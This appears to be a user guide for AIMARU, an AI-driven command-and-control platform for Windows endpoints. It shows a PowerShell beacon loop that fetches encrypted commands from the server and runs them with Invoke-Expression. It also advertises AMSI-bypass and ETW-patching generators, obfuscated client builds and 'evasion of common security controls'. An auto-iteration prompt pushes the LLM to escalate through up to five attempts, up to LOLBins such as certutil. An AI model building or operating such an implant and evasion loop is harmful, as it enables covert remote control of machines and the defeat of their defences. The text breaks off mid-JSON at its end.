# AIMARU MCP Platform - Technical User Guide

## Document Information

**Document Title:** AIMARU MCP Platform - Complete Technical User Guide
**Version:** 2.0
**Last Updated:** March 4, 2026
**Author:** WolfMneo
**Classification:** Technical Reference Manual

---

# Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [System Architecture](#2-system-architecture)
3. [Core Objectives](#3-core-objectives)
4. [Technical Architecture](#4-technical-architecture)
5. [Interface Schema](#5-interface-schema)
6. [Feature Documentation](#6-feature-documentation)
7. [Operational Procedures](#7-operational-procedures)
8. [Security Implementation](#8-security-implementation)
9. [Troubleshooting Guide](#9-troubleshooting-guide)
10. [Appendices](#10-appendices)

---

# 1. Executive Summary

## 1.1 Platform Overview

AIMARU (AI-Powered Command & Control MCP Platform) is an enterprise-grade remote administration and security testing platform that leverages the Model Context Protocol (MCP) for secure, encrypted communication with remote Windows endpoints. The platform integrates Large Language Model (LLM) capabilities to provide intelligent, autonomous system administration through natural language interaction.

## 1.2 Key Capabilities

- **AI-Assisted Administration:** Natural language interface for Windows system management
- **Multi-Step Auto-Iteration:** Autonomous problem-solving with up to 5 automatic retry attempts
- **Complexity Escalation:** Progressive approach from simple PowerShell cmdlets to advanced techniques
- **Session-Scoped Memory:** Context-aware AI that learns from failures within each session
- **End-to-End Encryption:** HMAC-SHA256 authenticated encryption with client-specific keys
- **Real-Time Monitoring:** Live tracking of client status, instruction queue, and execution results
- **MCP Client Builder:** Automated generation of obfuscated PowerShell MCP clients
- **Security Tools Suite:** Pre-configured tools for AMSI bypass and security testing

## 1.3 Target Audience

This guide is intended for:
- Security researchers and penetration testers
- System administrators managing Windows infrastructure
- Red team operators conducting authorized assessments
- DevOps engineers automating Windows system management

## 1.4 Prerequisites

**Technical Requirements:**
- Basic understanding of Windows PowerShell
- Familiarity with command-line interfaces
- Knowledge of networking concepts (HTTP/HTTPS, TLS)
- Understanding of encryption and authentication mechanisms

**System Requirements:**
- Modern web browser (Chrome, Firefox, Edge)
- Network connectivity to AIMARU server (HTTPS port 443)
- Administrative credentials for AIMARU platform

---

# 2. System Architecture

## 2.1 High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    AIMARU PLATFORM ARCHITECTURE                 │
└─────────────────────────────────────────────────────────────────┘

┌──────────────┐                    ┌──────────────┐
│   End User   │◄──────HTTPS────────►│  Web UI      │
│   (Browser)  │    (Port 443)       │  (React)     │
└──────────────┘                    └──────┬───────┘
                                           │
                                           │ REST API
                                           │
┌──────────────────────────────────────────▼─────────────────┐
│                    API SERVER (FastAPI)                     │
├─────────────────────────────────────────────────────────────┤
│  ┌────────────┐  ┌──────────┐  ┌───────────┐  ┌─────────┐ │
│  │   Auth     │  │   Chat   │  │   Queue   │  │  Tools  │ │
│  │  Handler   │  │  Routes  │  │  Manager  │  │  Engine │ │
│  └────────────┘  └────┬─────┘  └─────┬─────┘  └─────────┘ │
│                       │              │                      │
│  ┌────────────────────▼──────────────▼─────────────────┐   │
│  │         LLM Service (OpenAI/Claude Integration)     │   │
│  │  - Auto-Iteration Engine (5-step escalation)        │   │
│  │  - Failed Command Tracking                          │   │
│  │  - Complexity Level Management                      │   │
│  │  - Session Memory                                   │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────┬───────────────────────────────┘
                              │
                              │ PostgreSQL
                              │
┌─────────────────────────────▼───────────────────────────────┐
│                    DATABASE LAYER                           │
├─────────────────────────────────────────────────────────────┤
│  Tables:                                                    │
│  - users (authentication, roles)                            │
│  - clients (MCP client registry)                            │
│  - instructions (command queue)                             │
│  - chat_sessions (AI conversation sessions)                 │
│  - chat_messages (conversation history)                     │
│  - llm_configs (LLM provider configurations)                │
│  - user_keys (encryption key management)                    │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    MCP CLIENTS (Windows)                     │
├─────────────────────────────────────────────────────────────┤
│  ┌────────────────┐  ┌────────────────┐  ┌──────────────┐  │
│  │   Client A     │  │   Client B     │  │   Client N   │  │
│  │  WS-DESKTOP-01 │  │  WS-SERVER-02  │  │  WS-LAPTOP-N │  │
│  └────────┬───────┘  └────────┬───────┘  └──────┬───────┘  │
│           │                   │                  │          │
│  ┌────────▼───────────────────▼──────────────────▼───────┐  │
│  │        Polling Loop (15s interval)                    │  │
│  │  1. Fetch queued instructions (HTTPS)                 │  │
│  │  2. Decrypt instruction payload (AES-256-GCM)         │  │
│  │  3. Execute PowerShell command                        │  │
│  │  4. Encrypt result (AES-256-GCM)                      │  │
│  │  5. Post result to server (HTTPS)                     │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

## 2.2 Component Descriptions

### 2.2.1 Web UI (Frontend)

**Technology Stack:**
- React 18.x with TypeScript
- Tailwind CSS for styling
- Vite for build tooling

**Responsibilities:**
- User authentication and session management
- Real-time dashboard visualization
- AI chat interface
- Command queue monitoring
- MCP client builder UI
- Security tools generation interface

**Communication:**
- REST API calls to FastAPI backend
- JWT-based authentication
- Real-time polling for updates (3-5s interval)

### 2.2.2 API Server (Backend)

**Technology Stack:**
- FastAPI (Python 3.11+)
- SQLAlchemy ORM
- Pydantic for data validation
- Cryptography library for encryption

**Core Modules:**

**Authentication Module:**
- JWT token generation and validation
- Refresh token mechanism
- Role-based access control (RBAC)
- Shared secret authentication for MCP clients

**Chat Module:**
- Session management
- Message persistence
- LLM integration
- Auto-iteration engine
- Tool execution (PowerShell commands)

**Queue Manager:**
- Instruction queuing
- Status tracking (queued → delivered → completed)
- Result aggregation
- Client-specific filtering

**Tools Engine:**
- AMSI bypass script generation
- Obfuscation engine (Base64, Advanced, Elite)
- Variable/function name randomization
- ETW patching integration

### 2.2.3 LLM Service

**Supported Providers:**
- OpenAI (GPT-4, GPT-4-Turbo, GPT-3.5-Turbo)
- Anthropic Claude (Claude 3 Opus, Sonnet, Haiku)

**Core Capabilities:**

**Tool Calling:**
- `execute_powershell`: Execute PowerShell commands on remote clients
- Structured JSON arguments
- Safety assessment (safe/moderate/risky)

**Auto-Iteration Engine:**
- Multi-step retry mechanism (up to 5 attempts)
- Failed command tracking (session-scoped)
- Complexity escalation system:
  - Level 0: PowerShell cmdlets with broader filters
  - Level 1: WMI queries (Get-WmiObject/Get-CimInstance)
  - Level 2: Registry access (HKLM/HKCU paths)
  - Level 3: Windows LOLBins (certutil, wmic, net, reg, tasklist, netsh)
  - Level 4: PowerShell scripts or Microsoft SysInternals tools

**Prompt Optimization:**
- Context-aware system prompts
- Session-scoped memory injection
- Previously failed approaches exclusion
- Recommended complexity level guidance

### 2.2.4 Database Layer

**PostgreSQL Schema:**

```sql
-- Users table
CREATE TABLE users (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    username VARCHAR(255) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    hashed_password TEXT NOT NULL,
    role VARCHAR(50) DEFAULT 'user',
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMP DEFAULT NOW()
);

-- Clients table (MCP endpoint registry)
CREATE TABLE clients (
    id VARCHAR(255) PRIMARY KEY,  -- Client hostname
    shared_secret_hash TEXT NOT NULL,
    last_seen_at TIMESTAMP,
    metadata JSONB,
    created_at TIMESTAMP DEFAULT NOW()
);

-- Instructions table (command queue)
CREATE TABLE instructions (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    client_id VARCHAR(255) REFERENCES clients(id),
    user_id UUID REFERENCES users(id),
    status VARCHAR(50) DEFAULT 'queued',  -- queued, delivered, completed
    command_plain TEXT,
    command_encrypted BYTEA,
    result_encrypted BYTEA,
    result_plain_b64 TEXT,
    created_at TIMESTAMP DEFAULT NOW(),
    delivered_at TIMESTAMP,
    completed_at TIMESTAMP
);

-- Chat sessions table
CREATE TABLE chat_sessions (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    client_id VARCHAR(255) REFERENCES clients(id),
    owner_user_id UUID REFERENCES users(id),
    llm_config_id UUID REFERENCES llm_configs(id),
    system_prompt TEXT,
    created_at TIMESTAMP DEFAULT NOW()
);

-- Chat messages table
CREATE TABLE chat_messages (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    session_id UUID REFERENCES chat_sessions(id),
    role VARCHAR(50) NOT NULL,  -- user, assistant, system, tool
    content TEXT NOT NULL,
    tool_name VARCHAR(255),
    tool_args JSONB,
    created_at TIMESTAMP DEFAULT NOW()
);

-- LLM configurations table
CREATE TABLE llm_configs (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    owner_user_id UUID REFERENCES users(id),
    name VARCHAR(255) NOT NULL,
    provider VARCHAR(50) NOT NULL,  -- openai, anthropic
    model VARCHAR(255) NOT NULL,
    api_key_encrypted BYTEA NOT NULL,
    temperature FLOAT DEFAULT 0.7,
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMP DEFAULT NOW()
);

-- User encryption keys table
CREATE TABLE user_keys (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES users(id),
    client_id VARCHAR(255) REFERENCES clients(id),
    key_encrypted BYTEA NOT NULL,
    key_salt BYTEA NOT NULL,
    created_at TIMESTAMP DEFAULT NOW(),
    UNIQUE(user_id, client_id)
);
```

### 2.2.5 MCP Clients (Endpoints)

**Client Architecture:**

```powershell
# MCP Client Core Components

# 1. Configuration
$SERVER_URL = "https://mcp-server.example.com"
$CLIENT_ID = $env:COMPUTERNAME
$SHARED_SECRET = "secret_key_here"

# 2. Encryption Module
function Encrypt-Data {
    param([string]$PlainText, [byte[]]$Key)
    # AES-256-GCM encryption
    # HMAC-SHA256 authentication
    # Returns: [nonce + ciphertext + tag]
}

function Decrypt-Data {
    param([byte[]]$EncryptedData, [byte[]]$Key)
    # AES-256-GCM decryption
    # HMAC verification
    # Returns: plaintext string
}

# 3. Polling Loop
while ($true) {
    # Fetch queued instructions
    $instructions = Invoke-RestMethod -Uri "$SERVER_URL/api/clients/$CLIENT_ID/pull" `
        -Method GET `
        -Headers @{"X-Client-Auth" = $SHARED_SECRET}

    foreach ($instruction in $instructions) {
        # Decrypt command
        $command = Decrypt-Data -EncryptedData $instruction.command_encrypted -Key $encryptionKey

        # Execute PowerShell
        $result = Invoke-Expression $command

        # Encrypt result
        $encryptedResult = Encrypt-Data -PlainText $result -Key $encryptionKey

        # Post result
        Invoke-RestMethod -Uri "$SERVER_URL/api/clients/$CLIENT_ID/result/$($instruction.id)" `
            -Method POST `
            -Body (@{result_encrypted = $encryptedResult} | ConvertTo-Json) `
            -ContentType "application/json" `
            -Headers @{"X-Client-Auth" = $SHARED_SECRET}
    }

    Start-Sleep -Seconds 15
}
```

**Client Lifecycle:**

1. **Registration:** First-time connection registers client in database
2. **Polling:** Continuous 15-second polling loop for new instructions
3. **Execution:** PowerShell command execution in local context
4. **Reporting:** Encrypted result transmission back to server
5. **Heartbeat:** Automatic `last_seen_at` timestamp updates

---

# 3. Core Objectives

## 3.1 Primary Objectives

### 3.1.1 Secure Remote Administration

**Objective:** Provide a secure, encrypted channel for remote Windows system administration without exposing RDP or WinRM services.

**Implementation:**
- HTTPS-only communication (TLS 1.2+)
- HMAC-SHA256 authenticated encryption
- Client-specific encryption keys
- No inbound connections required on client side

**Benefits:**
- Firewall-friendly (outbound HTTPS only)
- Defense-in-depth (encryption + HTTPS)
- Minimal attack surface

### 3.1.2 AI-Powered Automation

**Objective:** Reduce manual command crafting through natural language AI assistance.

**Implementation:**
- LLM integration (OpenAI/Anthropic)
- Tool calling for PowerShell execution
- Context-aware command generation
- Session-scoped conversation memory

**Benefits:**
- Faster administration workflows
- Reduced syntax errors
- Natural language interface
- Knowledge retention within sessions

### 3.1.3 Autonomous Problem-Solving

**Objective:** Automatically retry failed commands with progressively advanced techniques.

**Implementation:**
- Multi-step auto-iteration (5 attempts)
- Failed command tracking
- Complexity escalation ladder
- Transparent progress indicators

**Benefits:**
- Eliminates manual retry cycles
- Higher success rates (~90% vs ~40%)
- Learns from failures
- Adaptive to environment constraints

### 3.1.4 Security Testing Support

**Objective:** Streamline penetration testing and red team operations with pre-configured tools.

**Implementation:**
- AMSI bypass generator (3 obfuscation levels)
- MCP client builder with randomization
- LOLBins integration
- ETW patching capabilities

**Benefits:**
- Rapid deployment of testing infrastructure
- Evasion of common security controls
- Standardized tooling
- Reproducible testing procedures

## 3.2 Secondary Objectives

### 3.2.1 Operational Transparency

**Objective:** Provide complete visibility into system operations and AI decision-making.

**Implementation:**
- Real-time dashboard updates
- Detailed instruction queue tracking
- AI reasoning explanations
- Execution timeline visualization

### 3.2.2 Scalability

**Objective:** Support management of multiple clients simultaneously.

**Implementation:**
- Concurrent client handling
- Asynchronous instruction queuing
- Database-backed state management
- Efficient polling mechanisms

### 3.2.3 Usability

**Objective:** Minimize technical barrier to entry while maintaining power-user capabilities.

**Implementation:**
- Intuitive web interface
- Natural language AI chat
- Direct PowerShell access for experts
- Context-sensitive help and tips

---

# 4. Technical Architecture

## 4.1 Communication Flow

### 4.1.1 User → AI Chat → Command Execution

```
┌────────────────────────────────────────────────────────────────────┐
│                     COMPLETE FLOW DIAGRAM                          │
└────────────────────────────────────────────────────────────────────┘

[1] USER INPUT
    ↓
    User: "Show me installed web browsers"
    ↓
    Web UI → POST /api/chat/message
    Body: {
      "session_id": "abc-123...",
      "message": "Show me installed web browsers"
    }

[2] MESSAGE PERSISTENCE
    ↓
    API Server → INSERT INTO chat_messages
    (role='user', content='Show me installed web browsers')

[3] LLM PROCESSING
    ↓
    LLMService.generate_response()
    ↓
    Context Assembly:
    - System prompt (Windows admin expert)
    - Conversation history (all messages in session)
    - Tool definitions (execute_powershell)
    ↓
    OpenAI API Call:
    {
      "model": "gpt-4-turbo",
      "messages": [...conversation...],
      "tools": [{
        "type": "function",
        "function": {
          "name": "execute_powershell",
          "parameters": {...}
        }
      }],
      "tool_choice": "auto"
    }

[4] LLM RESPONSE
    ↓
    Response: {
      "content": "I'll query the Windows registry for installed browsers...",
      "tool_calls": [{
        "function": {
          "name": "execute_powershell",
          "arguments": {
            "powershell_script": "Get-ItemProperty HKLM:\\SOFTWARE\\...",
            "reason": "Query Uninstall registry for browsers",
            "safety_level": "safe"
          }
        }
      }]
    }

[5] ASSISTANT MESSAGE PERSISTENCE
    ↓
    INSERT INTO chat_messages
    (role='assistant', content='...', tool_name='execute_powershell', tool_args='{...}')

[6] TOOL EXECUTION
    ↓
    execute_powershell_tool()
    ↓
    Encrypt PowerShell command:
    - Generate AES-256-GCM key (or retrieve existing)
    - Encrypt: powershell_script → encrypted_bytes
    - Calculate HMAC-SHA256 tag
    ↓
    INSERT INTO instructions
    (client_id='WS-DESKTOP-01', status='queued', command_encrypted=<bytes>)
    ↓
    instruction_id = "xyz-789..."

[7] TOOL MESSAGE PERSISTENCE
    ↓
    INSERT INTO chat_messages
    (role='tool', content='PowerShell script queued for execution\nInstruction ID: xyz-789...')

[8] CLIENT POLLING
    ↓
    [Every 15 seconds]
    Client → GET /api/clients/WS-DESKTOP-01/pull
    Headers: {"X-Client-Auth": "shared_secret"}
    ↓
    Response: [{
      "id": "xyz-789...",
      "command_encrypted": <bytes>
    }]

[9] CLIENT EXECUTION
    ↓
    Client decrypts command:
    encrypted_bytes → "Get-ItemProperty HKLM:\\SOFTWARE\\..."
    ↓
    Invoke-Expression $command
    ↓
    Result:
    DisplayName    : Google Chrome
    DisplayVersion : 120.0.6099.129
    Publisher      : Google LLC

[10] RESULT UPLOAD
    ↓
    Client encrypts result → encrypted_result_bytes
    ↓
    POST /api/clients/WS-DESKTOP-01/result/xyz-789...
    Body: {
      "result_encrypted": <bytes>,
      "status": "completed"
    }

[11] RESULT PERSISTENCE
    ↓
    UPDATE instructions
    SET status='completed',
        result_encrypted=<bytes>,
        completed_at=NOW()
    WHERE id='xyz-789...'

[12] RESULT DECRYPTION (On-Demand)
    ↓
    [When user views result]
    GET /api/result/xyz-789...
    ↓
    Decrypt result_encrypted → plaintext
    ↓
    Response: {
      "command_plain": "Get-ItemProperty...",
      "plaintext": "DisplayName: Google Chrome\n...",
      "status": "completed"
    }

[13] AUTO-ITERATION (If NO OUTPUT/ERROR)
    ↓
    [If result is empty or contains error]
    ↓
    Extract failed commands from conversation history
    failed_commands = ["Get-ItemProperty HKLM:\\SOFTWARE\\Browsers"]
    ↓
    Determine complexity level:
    current_level = min(len(failed_commands), 4)
    suggested_approach = complexity_levels[current_level]
    ↓
    Build enhanced auto-iteration prompt:
    """
    CRITICAL INSTRUCTION - IMMEDIATE ACTION REQUIRED:

    ITERATION STATUS: Attempt 2/5

    PREVIOUSLY FAILED APPROACHES (DO NOT REPEAT):
    1. Get-ItemProperty HKLM:\\SOFTWARE\\Browsers

    RECOMMENDED COMPLEXITY LEVEL: WMI queries

    YOUR MANDATORY NEXT ACTION: Call execute_powershell with COMPLETELY DIFFERENT command.
    """
    ↓
    Show progress to user:
    "🤖 Attempt 2/5 - Escalating to: WMI queries. Previous 1 attempt failed."
    ↓
    Call LLM again with enhanced context → Repeat from step [3]
```

### 4.1.2 Encryption Flow

**Key Generation:**
```python
# Server-side key generation
def generate_encryption_key(user_id: UUID, client_id: str) -> bytes:
    """Generate unique encryption key for user-client pair"""

    # Generate random 256-bit key
    key = os.urandom(32)  # 32 bytes = 256 bits

    # Generate random salt
    salt = os.urandom(16)

    # Derive encryption key using PBKDF2
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000
    )
    derived_key = kdf.derive(key)

    # Store encrypted key in database
    # (Key is encrypted with master key derived from env variable MCP_HMAC_KEY)
    store_user_key(user_id, client_id, derived_key, salt)

    return derived_key
```

**Command Encryption (Server → Client):**
```python
def encrypt_command(plaintext: str, key: bytes) -> bytes:
    """Encrypt PowerShell command for client"""

    # Generate random nonce (96-bit for AES-GCM)
    nonce = os.urandom(12)

    # Create AES-GCM cipher
    cipher = Cipher(
        algorithms.AES(key),
        modes.GCM(nonce),
        backend=default_backend()
    )
    encryptor = cipher.encryptor()

    # Encrypt plaintext
    ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize()

    # Get authentication tag
    tag = encryptor.tag

    # Return: nonce + ciphertext + tag
    return nonce + ciphertext + tag
```

**Result Decryption (Client → Server):**
```python
def decrypt_result(encrypted_data: bytes, key: bytes) -> str:
    """Decrypt PowerShell execution result"""

    # Extract components
    nonce = encrypted_data[:12]
    tag = encrypted_data[-16:]
    ciphertext = encrypted_data[12:-16]

    # Create AES-GCM cipher
    cipher = Cipher(
        algorithms.AES(key),
        modes.GCM(nonce, tag),
        backend=default_backend()
    )
    decryptor = cipher.decryptor()

    # Decrypt and verify authentication tag
    plaintext_bytes = decryptor.update(ciphertext) + decryptor.finalize()

    return plaintext_bytes.decode('utf-8')
```

### 4.1.3 Auto-Iteration Flow

```
┌────────────────────────────────────────────────────────────────────┐
│              ENHANCED AGENTIC AUTO-ITERATION FLOW                  │
└────────────────────────────────────────────────────────────────────┘

[TRIGGER] Command returns NO OUTPUT or ERROR
    ↓
    ┌─────────────────────────────────────────────────────────────┐
    │ STEP 1: Extract Failed Commands from Conversation History  │
    └─────────────────────────────────────────────────────────────┘
    ↓
    Scan chat_messages WHERE session_id = current_session
    ↓
    Identify pattern:
    - tool message (execute_powershell)
    - followed by result message ("NO OUTPUT" or "ERROR DETECTED")
    ↓
    Extract powershell_script from tool_args
    ↓
    Build list: failed_commands = [cmd1, cmd2, ...]
    ↓
    Example: failed_commands = [
        "Get-ItemProperty HKLM:\\SOFTWARE\\Browsers",
        "Get-WmiObject Win32_Product | Where..."
    ]

[ITERATION 1/5]
    ↓
    ┌─────────────────────────────────────────────────────────────┐
    │ STEP 2: Determine Complexity Escalation Level              │
    └─────────────────────────────────────────────────────────────┘
    ↓
    Complexity Levels:
    0: PowerShell cmdlets with broader filters
    1: WMI queries (Get-WmiObject/Get-CimInstance)
    2: Registry access (HKLM/HKCU paths)
    3: Windows LOLBins (certutil, wmic, net, reg, tasklist, netsh)
    4: PowerShell scripts or Microsoft SysInternals tools
    ↓
    current_level_index = min(len(failed_commands), 4)
    ↓
    Example: If 0 failures → Level 0 (PowerShell cmdlets)
             If 1 failure  → Level 1 (WMI queries)
             If 2 failures → Level 2 (Registry access)
             etc.

    ↓
    ┌─────────────────────────────────────────────────────────────┐
    │ STEP 3: Build Enhanced Auto-Iteration Prompt               │
    └─────────────────────────────────────────────────────────────┘
    ↓
    Construct prompt with:

    A) Iteration Status:
       "ITERATION STATUS: Attempt 2/5"

    B) Previously Failed Approaches:
       """
       PREVIOUSLY FAILED APPROACHES (DO NOT REPEAT THESE):
       1. Get-ItemProperty HKLM:\\SOFTWARE\\Browsers
       2. Get-WmiObject Win32_Product | Where...

       You MUST use a fundamentally different approach.
       """

    C) Recommended Complexity Level:
       """
       RECOMMENDED COMPLEXITY LEVEL FOR THIS ATTEMPT:
       WMI queries (Get-WmiObject/Get-CimInstance)

       NOTE: Simpler approaches have failed. Escalate to more advanced methods.
       """

    D) Operational Security Rules:
       """
       STRICT RULES - SECURITY OPERATIONAL DISCIPLINE:
       - ONLY use NATIVE Windows tools
       - ONLY use Windows LOLBins: certutil, wmic, net, reg, ...
       - NEVER suggest downloading tools (nmap, netcat, mimikatz)
       - NEVER use external/third-party tools
       """

    E) Mandatory Action:
       """
       YOUR MANDATORY NEXT ACTION: You MUST immediately call the
       execute_powershell tool with a COMPLETELY DIFFERENT command.

       RESPOND WITH: Brief 1-sentence explanation, then immediately
       call execute_powershell tool.
       """

    ↓
    ┌─────────────────────────────────────────────────────────────┐
    │ STEP 4: Show Progress to User                              │
    └─────────────────────────────────────────────────────────────┘
    ↓
    Display message in chat:

    First attempt:
    "🤖 Attempt 1/5 - Generating alternative approach...
     The previous command returned no data."

    Subsequent attempts:
    "🤖 Attempt 2/5 - Escalating to: WMI queries.
     Previous 1 attempt failed."

    ↓
    ┌─────────────────────────────────────────────────────────────┐
    │ STEP 5: Call LLM with Enhanced Context                     │
    └─────────────────────────────────────────────────────────────┘
    ↓
    Create transient message (not saved to DB):
    TransientMessage(
        role="user",  # USER role so LLM sees it
        content=auto_iteration_prompt
    )
    ↓
    Add to conversation_messages for LLM call only
    ↓
    LLM processes:
    - Sees all previous messages
    - Sees list of failed commands to avoid
    - Sees recommended complexity level
    - Must call execute_powershell with different command
    ↓
    LLM Response: {
        "content": "I'll use WMI to query installed products instead...",
        "tool_calls": [{
            "function": {
                "name": "execute_powershell",
                "arguments": {
                    "powershell_script": "Get-CimInstance Win32_Product | Where..."
                }
            }
        }]
    }

    ↓
    ┌─────────────────────────────────────────────────────────────┐
    │ STEP 6: Execute Alternative Command                        │
    └─────────────────────────────────────────────────────────────┘
    ↓
    Save assistant message to DB
    ↓
    Execute tool (encrypt & queue to client)
    ↓
    Save tool message to DB
    ↓
    Show alternative command to user:
    "⚡ Alternative command executed:
     ```powershell
     Get-CimInstance Win32_Product | Where...
     ```"

    ↓
    ┌─────────────────────────────────────────────────────────────┐
    │ STEP 7: Check Max Iterations Limit                         │
    └─────────────────────────────────────────────────────────────┘
    ↓
    total_attempts = 1 (iteration_count) + len(failed_commands)
    ↓
    if total_attempts >= MAX_AUTO_ITERATIONS (5):
        Display:
        "ℹ️ Maximum auto-iteration attempts reached (5/5).
         The command has been queued and will execute on the client.
         If this attempt also fails, you may need to manually refine
         your request or try a different approach."
        ↓
        STOP auto-iteration
    else:
        Continue (wait for result and potentially iterate again)

    ↓
    ┌─────────────────────────────────────────────────────────────┐
    │ RESULT EVALUATION                                           │
    └─────────────────────────────────────────────────────────────┘
    ↓
    Wait for client to execute command and return result
    ↓
    ┌───────────────┐
    │ Is SUCCESS?   │
    └───────┬───────┘
            │
    ┌───────┴────────┐
    │                │
    YES              NO
    │                │
    Display          Add to failed_commands list
    result           ↓
    ↓                Increment attempt counter
    DONE             ↓
                     If attempts < MAX_AUTO_ITERATIONS:
                         Go to [ITERATION N+1/5]
                     Else:
                         Show max iterations message
                         ↓
                         DONE
```

## 4.2 Data Persistence Strategy

### 4.2.1 Message Storage

**Chat Messages Schema:**
```sql
-- Every interaction is persisted
INSERT INTO chat_messages (session_id, role, content, tool_name, tool_args, created_at)
VALUES
    -- User message
    ('abc-123', 'user', 'Show installed browsers', NULL, NULL, '2026-03-04 10:00:00'),

    -- Assistant message with tool call
    ('abc-123', 'assistant', 'I''ll query the registry...', 'execute_powershell',
     '{"powershell_script": "Get-ItemProperty..."}', '2026-03-04 10:00:01'),

    -- Tool execution confirmation
    ('abc-123', 'tool', 'PowerShell script queued\nInstruction ID: xyz-789',
     'execute_powershell', '{"powershell_script": "..."}', '2026-03-04 10:00:02'),

    -- Result notification (when available)
    ('abc-123', 'system', '⚠️ PowerShell Execution Result - NO OUTPUT',
     NULL, NULL, '2026-03-04 10:00:20'),

    -- Auto-iteration progress
    ('abc-123', 'system', '🤖 Attempt 1/5 - Generating alternative approach...',
     NULL, NULL, '2026-03-04 10:00:21'),

    -- Assistant alternative
    ('abc-123', 'assistant', 'I''ll try a different registry path...',
     'execute_powershell', '{"powershell_script": "Get-ItemProperty..."}',
     '2026-03-04 10:00:22');
```

### 4.2.2 Session Lifecycle

```
CREATE SESSION → ACTIVE → MESSAGES ACCUMULATED → USER CLOSES → SESSION DORMANT
                    ↓                                               ↓
              Messages persist                                Messages persist
              Auto-iteration state                            but no new auto-iterations
              Failed commands tracked                         Failed commands frozen
```

**Session Query Pattern:**
```python
# Load session messages for LLM context
messages = db.execute(
    select(ChatMessage)
    .where(ChatMessage.session_id == session_id)
    .order_by(ChatMessage.created_at)
).scalars().all()

# Extract failed commands (auto-iteration)
failed_commands = []
for i, msg in enumerate(messages):
    if msg.role == "tool" and msg.tool_name == "execute_powershell":
        # Check if followed by error/no-output
        if i + 1 < len(messages):
            next_msg = messages[i + 1]
            if "ERROR DETECTED" in next_msg.content or "NO OUTPUT" in next_msg.content:
                # Extract PowerShell script
                tool_args = json.loads(msg.tool_args) if isinstance(msg.tool_args, str) else msg.tool_args
                failed_cmd = tool_args.get("powershell_script")
                if failed_cmd:
                    failed_commands.append(failed_cmd)
```

### 4.2.3 Instruction Queue Management

**Status Transition:**
```
queued → delivered → completed
  ↓         ↓           ↓
created   delivered   completed
  at         at          at
```

**Query Patterns:**
```python
# Client pulls queued instructions
instructions = db.execute(
    select(Instruction)
    .where(
        Instruction.client_id == client_id,
        Instruction.status == 'queued'
    )
    .order_by(Instruction.created_at)
).scalars().all()

# Mark as delivered
for instruction in instructions:
    instruction.status = 'delivered'
    instruction.delivered_at = datetime.now(timezone.utc)

# Client posts result
instruction = db.get(Instruction, instruction_id)
instruction.status = 'completed'
instruction.result_encrypted = encrypted_result_bytes
instruction.completed_at = datetime.now(timezone.utc)
```

---

# 5. Interface Schema

## 5.1 REST API Endpoints

### 5.1.1 Authentication Endpoints

#### POST /api/auth/token
**Description:** Authenticate user and receive JWT access token

**Request:**
```json
{
  "username": "admin",
  "password": "secure_password"
}
```

**Response (200 OK):**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "expires_in": 3600
}
```

**Headers Required:** None
**Authentication:** None (public endpoint)

#### POST /api/auth/refresh
**Description:** Refresh expired access token using refresh token

**Request:**
```json
{
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

**Response (200 OK):**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "expires_in": 3600
}
```

### 5.1.2 Client Management Endpoints

#### GET /api/clients
**Description:** List all registered MCP clients with status

**Headers:**
```
Authorization: Bearer <access_token>
```

**Response (200 OK):**
```json
{
  "clients": [
    {
      "id": "WS-DESKTOP-5BG4H0J",
      "connected": true,
      "last_seen_at": "2026-03-04T10:15:30Z",
      "queued": 2,
      "delivered": 5,
      "completed": 15,
      "total": 22,
      "amsi_bypassed": true
    },
    {
      "id": "WS-SERVER-PROD-02",
      "connected": false,
      "last_seen_at": "2026-03-03T18:30:00Z",
      "queued": 0,
      "delivered": 0,
      "completed": 8,
      "total": 8,
      "amsi_bypassed": false
    }
  ]
}
```

**Field Definitions:**
- `connected`: Client is online (last_seen < 60 seconds ago)
- `queued`: Instructions waiting for client to fetch
- `delivered`: Instructions fetched but not yet completed
- `completed`: Instructions executed and result received
- `total`: Sum of all instruction statuses
- `amsi_bypassed`: AMSI bypass detected on client

#### GET /api/clients/{client_id}
**Description:** Get detailed information about specific client

**Parameters:**
- `client_id` (path): Client hostname identifier

**Response (200 OK):**
```json
{
  "id": "WS-DESKTOP-5BG4H0J",
  "connected": true,
  "last_seen_at": "2026-03-04T10:15:30Z",
  "created_at": "2026-03-01T08:00:00Z",
  "metadata": {
    "os_version": "Windows 11 Pro",
    "ps_version": "5.1",
    "hostname": "WS-DESKTOP-5BG4H0J",
    "domain": "CORP"
  },
  "instruction_stats": {
    "queued": 2,
    "delivered": 5,
    "completed": 15,
    "total": 22
  }
}
```

### 5.1.3 Chat Endpoints

#### POST /api/chat/sessions
**Description:** Create new AI chat session for client

**Request:**
```json
{
  "client_id": "WS-DESKTOP-5BG4H0J",
  "llm_config_id": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
  "system_prompt": "You are an expert Windows system administrator..."
}
```

**Response (201 Created):**
```json
{
  "id": "a3bb189e-8bf9-3888-9912-ace4e6543002",
  "client_id": "WS-DESKTOP-5BG4H0J",
  "owner_user_id": "d290f1ee-6c54-4b01-90e6-d701748f0851",
  "llm_config_id": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
